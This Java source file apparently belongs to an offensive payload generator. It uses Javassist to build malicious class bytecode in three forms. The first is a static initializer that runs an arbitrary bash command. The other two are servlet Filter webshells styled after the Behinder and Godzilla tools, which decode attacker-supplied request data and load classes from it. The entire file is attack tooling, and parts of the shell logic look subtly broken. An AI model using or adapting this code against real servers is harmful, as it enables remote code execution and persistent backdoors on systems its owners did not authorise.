package com.oobx.chains;

import javassist.*;
import org.springframework.stereotype.Component;

import java.util.Map;

/**
 * Generates a "command execution / webshell" class using Javassist.
 * Supports javax.servlet (legacy) and jakarta.servlet (Tomcat 10+) targets.
 *
 * shell_type: cmd / behinder / godzilla
 * servlet_api: javax (default) | jakarta
 */
@Component
public class CustomBytecodeHandler implements ChainHandler {

    @Override
    public PayloadResult generate(String chainId, Map<String, Object> params) throws Exception {
        String shellType = (String) params.getOrDefault("shell_type", "cmd");
        String cmd = (String) params.getOrDefault("cmd", "");
        String password = (String) params.getOrDefault("password", "cmd");
        String className = (String) params.getOrDefault("class_name", "Exploit");
        String urlPattern = (String) params.getOrDefault("url_pattern", "/favicon.ico");
        String servletApi = (String) params.getOrDefault("servlet_api", "javax");

        byte[] classBytes = switch (shellType) {
            case "behinder" -> generateBehinder(className, password, servletApi);
            case "godzilla" -> generateGodzilla(className, password, servletApi);
            default -> generateCmdExec(className, cmd);
        };

        return new PayloadResult(
                "application/java-vm",
                classBytes,
                Map.of("class_name", className, "shell_type", shellType,
                       "url_pattern", urlPattern, "servlet_api", servletApi));
    }

    private ClassPool buildPool(String servletApi) throws Exception {
        ClassPool pool = new ClassPool(ClassPool.getDefault());
        // Ensure both servlet APIs are findable by Javassist
        try {
            pool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
        } catch (Exception ignored) {}
        return pool;
    }

    private byte[] generateCmdExec(String className, String cmd) throws Exception {
        ClassPool pool = buildPool("javax");
        CtClass cc = pool.makeClass(className);
        String body = cmd.isEmpty()
                ? "{}"
                : String.format(
                    "{ try { Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"%s\"}); } catch(Exception e) {} }",
                    cmd.replace("\"", "\\\""));
        cc.makeClassInitializer().setBody(body);
        byte[] bytes = cc.toBytecode();
        cc.detach();
        return bytes;
    }

    private byte[] generateBehinder(String className, String password, String api) throws Exception {
        ClassPool pool = buildPool(api);
        String filterPkg = api.equals("jakarta") ? "jakarta.servlet" : "javax.servlet";
        String httpPkg = filterPkg + ".http";

        CtClass cc = pool.makeClass(className);
        cc.addInterface(pool.get(filterPkg + ".Filter"));

        String doFilter = String.format("""
            public void doFilter(%s.ServletRequest req, %s.ServletResponse resp,
                    %s.FilterChain chain) throws java.io.IOException, %s.ServletException {
                %s.http.HttpServletRequest request = (%s.http.HttpServletRequest) req;
                %s.http.HttpServletResponse response = (%s.http.HttpServletResponse) resp;
                String xc = "e45e329feb5d925b";
                String pass = "%s";
                try {
                    byte[] data = java.util.Base64.getDecoder().decode(request.getReader().readLine());
                    javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                    c.init(javax.crypto.Cipher.DECRYPT_MODE,
                        new javax.crypto.spec.SecretKeySpec((pass + xc).substring(0, 16).getBytes(), "AES"));
                    byte[] dec = c.doFinal(data);
                    ClassLoader cl = this.getClass().getClassLoader();
                    Class<?> clz = cl.loadClass(new String(dec, 0, Math.min(dec.length, 64)));
                    clz.newInstance();
                } catch (Exception e) {
                    chain.doFilter(req, resp);
                }
            }
            """,
            filterPkg, filterPkg, filterPkg, filterPkg,
            filterPkg, filterPkg, filterPkg, filterPkg,
            password);

        cc.addMethod(CtNewMethod.make(
            String.format("public void init(%s.FilterConfig fc) throws %s.ServletException {}", filterPkg, filterPkg), cc));
        cc.addMethod(CtNewMethod.make(doFilter, cc));
        cc.addMethod(CtNewMethod.make("public void destroy() {}", cc));
        cc.makeClassInitializer().setBody("{}");

        byte[] bytes = cc.toBytecode();
        cc.detach();
        return bytes;
    }

    private byte[] generateGodzilla(String className, String password, String api) throws Exception {
        ClassPool pool = buildPool(api);
        String filterPkg = api.equals("jakarta") ? "jakarta.servlet" : "javax.servlet";

        CtClass cc = pool.makeClass(className);
        cc.addInterface(pool.get(filterPkg + ".Filter"));

        String doFilter = String.format("""
            public void doFilter(%s.ServletRequest req, %s.ServletResponse resp,
                    %s.FilterChain chain) throws java.io.IOException, %s.ServletException {
                %s.http.HttpServletRequest request = (%s.http.HttpServletRequest) req;
                %s.http.HttpServletResponse response = (%s.http.HttpServletResponse) resp;
                String pass = "%s";
                try {
                    String param = request.getParameter(pass);
                    if (param != null) {
                        byte[] data = java.util.Base64.getDecoder().decode(param);
                        byte[] key = pass.getBytes("UTF-8");
                        byte[] dec = new byte[data.length];
                        for (int i = 0; i < data.length; i++) dec[i] = (byte)(data[i] ^ key[i %% key.length]);
                        ClassLoader cl = Thread.currentThread().getContextClassLoader();
                        Class<?> clz = cl.loadClass(new String(dec, 0, Math.min(dec.length, 64)));
                        clz.getMethod("run",
                            %s.http.HttpServletRequest.class,
                            %s.http.HttpServletResponse.class)
                          .invoke(clz.newInstance(), request, response);
                        return;
                    }
                } catch (Exception e) {}
                chain.doFilter(req, resp);
            }
            """,
            filterPkg, filterPkg, filterPkg, filterPkg,
            filterPkg, filterPkg, filterPkg, filterPkg,
            password, filterPkg, filterPkg);

        cc.addMethod(CtNewMethod.make(
            String.format("public void init(%s.FilterConfig fc) throws %s.ServletException {}", filterPkg, filterPkg), cc));
        cc.addMethod(CtNewMethod.make(doFilter, cc));
        cc.addMethod(CtNewMethod.make("public void destroy() {}", cc));
        cc.makeClassInitializer().setBody("{}");

        byte[] bytes = cc.toBytecode();
        cc.detach();
        return bytes;
    }
}
